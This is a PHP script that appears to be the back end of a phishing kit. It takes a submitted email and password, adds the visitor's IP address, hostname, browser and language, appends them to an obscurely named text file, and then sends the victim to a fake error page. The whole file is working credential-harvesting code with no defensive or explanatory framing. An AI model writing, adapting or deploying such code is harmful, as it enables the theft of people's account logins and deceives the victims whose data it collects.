<?php
$data .= $_POST['email'] . "\n";
$data .= $_POST['password'] . "\n";
$data .= date("F j, Y, g:i a") . "\n";
$data .= $_SERVER['REMOTE_ADDR'] . "\n";
$data .= gethostbyaddr($_SERVER['REMOTE_ADDR']) . "\n";
$data .= $_SERVER['HTTP_USER_AGENT'] . "\n";
$data .= $_SERVER['HTTP_ACCEPT_LANGUAGE'] . "\n";
$data .= "-------------------------------------" . "\n";
$file = "2145htne2e367utu.txt";

$fp = fopen($file, "a");
fwrite($fp, $data);
$email=$_POST['email']; 
header('Location: error.php?email='.$email.'&errr=errr');


?>